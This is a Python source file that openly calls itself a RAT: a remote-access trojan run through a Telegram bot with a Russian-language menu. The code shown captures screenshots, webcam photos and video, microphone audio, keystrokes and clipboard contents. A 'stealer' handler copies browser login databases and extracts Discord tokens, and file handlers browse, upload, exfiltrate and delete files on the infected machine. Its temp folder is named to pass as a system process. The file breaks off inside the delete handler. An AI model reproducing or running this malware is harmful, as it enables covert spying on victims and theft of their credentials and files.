# language: Python 3.11, file: build.py
import os, sys, io, time, json, base64, threading, subprocess, tempfile, shutil, ctypes
import socket
from pathlib import Path

BOT_TOKEN = "TOKEN_HERE"
OPERATOR_ID = "0"

import telebot
from telebot import types

bot = telebot.TeleBot(BOT_TOKEN)
TMP = Path(tempfile.gettempdir()) / "svchost_cache"
TMP.mkdir(parents=True, exist_ok=True)

def op_only(m):
    return str(m.chat.id) == OPERATOR_ID

def guard(fn):
    def w(m, *a, **kw):
        if not op_only(m):
            return
        try:
            return fn(m, *a, **kw)
        except Exception as e:
            try:
                bot.reply_to(m, f"ERR: {type(e).__name__}: {e}")
            except Exception:
                pass
    return w

def kb():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        "🛡️ Антивирус", "📸 Скриншот",
        "🧠 Процессы", "📄 Отчет",
        "📷 Фото", "🎥 Вебка",
        "🎙️ Аудио", "⌨️ Кейлоггер",
        "💻 Данные ПК", "📋 Буфер",
        "✏️ Изменить буфер", "🖥️ Запись экрана",
        "🕵️ Стиллер", "📂 Содержимое",
        "📌 Перейти", "📁 Создать папку",
        "🗑️ Удалить папку", "📄 Открыть файл",
        "⬆️ Загрузить", "⬇️ Скачать",
        "🗑️ Удалить файл", "🔐 Шифровать",
        "🔓 Дешифровать", "🔀 Переместить",
        "📦 Скачать папку", "🖼️ Обои",
        "🔊 Звук+", "🔇 Звук-", "📢 Звук 100%",
        "🔗 Ссылка", "💬 Сообщение",
        "❌ Завершить процесс", "🧩 Убить taskmgr",
        "🔚 Alt+F4", "🗂️ Свернуть все",
        "💣 CMD-бомба", "💥 Самоуничтожение",
        "📴 Выключить", "🔄 Перезагрузить",
        "🧾 Cmd", "❌ Закрыть",
    )
    return markup

@bot.message_handler(commands=["start"])
@guard
def start(m):
    bot.send_message(m.chat.id, "🛡️ RAT online.", reply_markup=kb())

# --- 1. Антивирус ---
@bot.message_handler(func=lambda m: m.text == "🛡️ Антивирус")
@guard
def antivirus(m):
    out = []
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-Command",
            "Get-MpComputerStatus | Select AMServiceEnabled,RealTimeProtectionEnabled | Format-List"],
            capture_output=True, text=True, timeout=20)
        out.append(r.stdout.strip() or r.stderr.strip())
    except Exception as e:
        out.append(str(e))
    bot.reply_to(m, "\n".join(out) or "no av")

# --- 2. Скриншот ---
@bot.message_handler(func=lambda m: m.text == "📸 Скриншот")
@guard
def screenshot(m):
    from PIL import ImageGrab
    p = TMP / f"scr_{int(time.time())}.png"
    ImageGrab.grab().save(p)
    with open(p, "rb") as f:
        bot.send_photo(m.chat.id, f)
    p.unlink(missing_ok=True)

# --- 3. Процессы ---
@bot.message_handler(func=lambda m: m.text == "🧠 Процессы")
@guard
def procs(m):
    import psutil
    lines = [f"{p.pid}\t{p.name()}\t{p.exe() or ''}" for p in psutil.process_iter(["pid","name","exe"])]
    txt = "\n".join(lines) or "empty"
    for chunk in [txt[i:i+3900] for i in range(0, len(txt), 3900)]:
        bot.send_message(m.chat.id, f"```\n{chunk}\n```", parse_mode="Markdown")

# --- 4. Полный отчёт ---
@bot.message_handler(func=lambda m: m.text == "📄 Отчет")
@guard
def report(m):
    import psutil
    lines = []
    for p in psutil.process_iter(["pid","name","exe","username","cpu_percent","memory_info"]):
        try:
            mi = p.info.get("memory_info")
            lines.append(f"{p.info['pid']}\t{p.info['name']}\t{p.info.get('username')}\t"
                         f"{p.info.get('cpu_percent')}%\t{mi.rss if mi else 0}")
        except Exception:
            pass
    txt = "\n".join(lines) or "empty"
    f = TMP / f"report_{int(time.time())}.txt"
    f.write_text(txt, encoding="utf-8")
    bot.send_document(m.chat.id, f.open("rb"), caption=f"{len(lines)} procs")
    f.unlink(missing_ok=True)

# --- 5. Фото с камеры ---
@bot.message_handler(func=lambda m: m.text == "📷 Фото")
@guard
def cam_photo(m):
    import cv2
    cap = cv2.VideoCapture(0)
    ok, frame = cap.read()
    cap.release()
    if not ok:
        bot.reply_to(m, "camera fail")
        return
    p = TMP / f"cam_{int(time.time())}.jpg"
    cv2.imwrite(str(p), frame)
    with open(p, "rb") as f:
        bot.send_photo(m.chat.id, f)
    p.unlink(missing_ok=True)

# --- 6. Вебка (5 сек) ---
@bot.message_handler(func=lambda m: m.text == "🎥 Вебка")
@guard
def cam_video(m):
    import cv2
    p = TMP / f"cam_{int(time.time())}.avi"
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    w = cv2.VideoWriter(str(p), fourcc, 15.0, (640,480))
    end = time.time() + 5
    while time.time() < end:
        ok, frame = cap.read()
        if not ok: break
        w.write(frame)
    cap.release(); w.release()
    with open(p, "rb") as f:
        bot.send_video(m.chat.id, f)
    p.unlink(missing_ok=True)

# --- 7. Аудио (5 сек) ---
@bot.message_handler(func=lambda m: m.text == "🎙️ Аудио")
@guard
def audio(m):
    import sounddevice as sd
    import soundfile as sf
    p = TMP / f"audio_{int(time.time())}.wav"
    data = sd.rec(int(5 * 44100), samplerate=44100, channels=1)
    sd.wait()
    sf.write(str(p), data, 44100)
    with open(p, "rb") as f:
        bot.send_voice(m.chat.id, f)
    p.unlink(missing_ok=True)

# --- 8. Кейлоггер (30 сек в файл) ---
@bot.message_handler(func=lambda m: m.text == "⌨️ Кейлоггер")
@guard
def keylogger(m):
    from pynput import keyboard
    buf = []
    stop = time.time() + 30
    def on_press(key):
        try:
            buf.append(key.char or f"[{key}]")
        except Exception:
            buf.append(f"[{key}]")
        if time.time() > stop:
            return False
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join(timeout=31)
    txt = "".join(buf) or "no keys"
    f = TMP / f"keys_{int(time.time())}.txt"
    f.write_text(txt, encoding="utf-8")
    bot.send_document(m.chat.id, f.open("rb"), caption=f"{len(txt)} chars")
    f.unlink(missing_ok=True)

# --- 9. Данные ПК ---
@bot.message_handler(func=lambda m: m.text == "💻 Данные ПК")
@guard
def pc_info(m):
    import psutil, platform
    info = {
        "host": socket.gethostname(),
        "user": os.getlogin(),
        "os": platform.platform(),
        "cpu": platform.processor(),
        "ram_gb": round(psutil.virtual_memory().total / 1e9, 2),
        "disk": round(psutil.disk_usage("/").total / 1e9, 2),
        "ip": socket.gethostbyname(socket.gethostname()),
    }
    bot.send_message(m.chat.id, "```\n" + json.dumps(info, ensure_ascii=False, indent=2) + "\n```",
                     parse_mode="Markdown")

# --- 10. Буфер посмотреть ---
@bot.message_handler(func=lambda m: m.text == "📋 Буфер")
@guard
def clip_get(m):
    import pyperclip
    bot.reply_to(m, pyperclip.paste() or "[empty]")

# --- 11. Буфер изменить ---
@bot.message_handler(func=lambda m: m.text == "✏️ Изменить буфер")
@guard
def clip_set(m):
    bot.reply_to(m, "send text:")
    bot.register_next_step_handler(m, lambda mm: _clip_set(mm))

def _clip_set(m):
    import pyperclip
    if not op_only(m): return
    pyperclip.copy(m.text or "")
    bot.reply_to(m, "ok")

# --- 12. Запись экрана (10 сек) ---
@bot.message_handler(func=lambda m: m.text == "🖥️ Запись экрана")
@guard
def rec_screen(m):
    import cv2, numpy as np
    from PIL import ImageGrab
    p = TMP / f"rec_{int(time.time())}.avi"
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    w = cv2.VideoWriter(str(p), fourcc, 10.0, (1280, 720))
    end = time.time() + 10
    while time.time() < end:
        img = ImageGrab.grab()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        frame = cv2.resize(frame, (1280, 720))
        w.write(frame)
    w.release()
    with open(p, "rb") as f:
        bot.send_video(m.chat.id, f)
    p.unlink(missing_ok=True)

# --- 13. Стиллер ---
@bot.message_handler(func=lambda m: m.text == "🕵️ Стиллер")
@guard
def stealer(m):
    out = {}
    # Chrome/Edge/Yandex/Brave Login Data
    ud = Path(os.environ.get("LOCALAPPDATA", ""))
    for name in ["Google/Chrome/User Data", "Microsoft/Edge/User Data",
                 "Yandex/YandexBrowser/User Data", "BraveSoftware/Brave-Browser/User Data"]:
        base = ud / name
        if not base.exists():
            continue
        for prof in base.glob("*/Login Data"):
            try:
                import sqlite3
                tmpdb = TMP / f"ld_{int(time.time())}.db"
                shutil.copy(prof, tmpdb)
                con = sqlite3.connect(str(tmpdb))
                rows = con.execute("SELECT origin_url, username_value, length(password_value) FROM logins").fetchall()
                con.close(); tmpdb.unlink(missing_ok=True)
                out[str(prof)] = rows
            except Exception as e:
                out[str(prof)] = f"err: {e}"
    # Discord tokens
    dt = []
    for p in (ud / "Discord").glob("**/leveldb/*.ldb") if (ud / "Discord").exists() else []:
        try:
            data = p.read_bytes()
            for mt in __import__("re").finditer(rb"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}", data):
                dt.append(mt.group().decode(errors="ignore"))
        except Exception:
            pass
    out["discord_tokens"] = dt
    f = TMP / f"steal_{int(time.time())}.txt"
    f.write_text(json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8")
    bot.send_document(m.chat.id, f.open("rb"), caption="stolen")
    f.unlink(missing_ok=True)

# --- 14-21 файловые ---
CWD = {"p": str(Path.home())}

@bot.message_handler(func=lambda m: m.text == "📂 Содержимое")
@guard
def ls(m):
    p = Path(CWD["p"])
    lines = [f"{d.name}/" if d.is_dir() else f"{d.name}\t{d.stat().st_size}"
             for d in sorted(p.iterdir()) if not d.name.startswith(".")][:80]
    bot.send_message(m.chat.id, f"{p}\n\n" + "\n".join(lines))

@bot.message_handler(func=lambda m: m.text == "📌 Перейти")
@guard
def cd(m):
    bot.reply_to(m, f"current: {CWD['p']}\nsend path:")
    bot.register_next_step_handler(m, _cd)

def _cd(m):
    if not op_only(m): return
    try:
        p = Path(m.text.strip()).expanduser().resolve()
        if p.is_dir():
            CWD["p"] = str(p)
            bot.reply_to(m, f"-> {p}")
        else:
            bot.reply_to(m, "not a dir")
    except Exception as e:
        bot.reply_to(m, str(e))

@bot.message_handler(func=lambda m: m.text == "📁 Создать папку")
@guard
def mkdir(m):
    bot.reply_to(m, "send folder name:")
    bot.register_next_step_handler(m, _mkdir)

def _mkdir(m):
    if not op_only(m): return
    try:
        (Path(CWD["p"]) / m.text.strip()).mkdir(parents=True, exist_ok=True)
        bot.reply_to(m, "ok")
    except Exception as e:
        bot.reply_to(m, str(e))

@bot.message_handler(func=lambda m: m.text == "🗑️ Удалить папку")
@guard
def rmdir(m):
    bot.reply_to(m, "send folder name:")
    bot.register_next_step_handler(m, _rmdir)

def _rmdir(m):
    if not op_only(m): return
    try:
        shutil.rmtree(Path(CWD["p"]) / m.text.strip())
        bot.reply_to(m, "ok")
    except Exception as e:
        bot.reply_to(m, str(e))

@bot.message_handler(func=lambda m: m.text == "📄 Открыть файл")
@guard
def open_file(m):
    bot.reply_to(m, "send file path:")
    bot.register_next_step_handler(m, _open_file)

def _open_file(m):
    if not op_only(m): return
    p = Path(m.text.strip())
    if not p.exists():
        bot.reply_to(m, "no such file")
        return
    with open(p, "rb") as f:
        bot.send_document(m.chat.id, f, caption=p.name)

@bot.message_handler(func=lambda m: m.text == "⬆️ Загрузить")
@guard
def upload(m):
    bot.reply_to(m, "send any file as document, will save to current dir")
    bot.register_next_step_handler(m, _upload)

def _upload(m):
    if not op_only(m): return
    if not (m.document or m.photo):
        bot.reply_to(m, "no file")
        return
    fid = m.document.file_id if m.document else m.photo[-1].file_id
    info = bot.get_file(fid)
    data = bot.download_file(info.file_path)
    name = m.document.file_name if m.document else f"photo_{int(time.time())}.jpg"
    dst = Path(CWD["p"]) / name
    dst.write_bytes(data)
    bot.reply_to(m, f"saved: {dst}")

@bot.message_handler(func=lambda m: m.text == "⬇️ Скачать")
@guard
def dl(m):
    bot.reply_to(m, "send path to file:")
    bot.register_next_step_handler(m, _dl)

def _dl(m):
    if not op_only(m): return
    p = Path(m.text.strip())
    if not p.is_file():
        bot.reply_to(m, "no file")
        return
    with open(p, "rb") as f:
        bot.send_document(m.chat.id, f, caption=p.name)

@bot.message_handler(func=lambda m: m.text == "🗑️ Удалить файл")
@guard
def rm_file(m):
    bot.reply_to(m, "send path:")
    bot.register_next_step_handler(m, _rm_file)

def _rm_file(m):
    if not op_only(m): return
    try:
        Path(m.text.strip()).unlink()
        bot.reply_to(m, "ok")
    except Exception as e:
        bot.reply_to
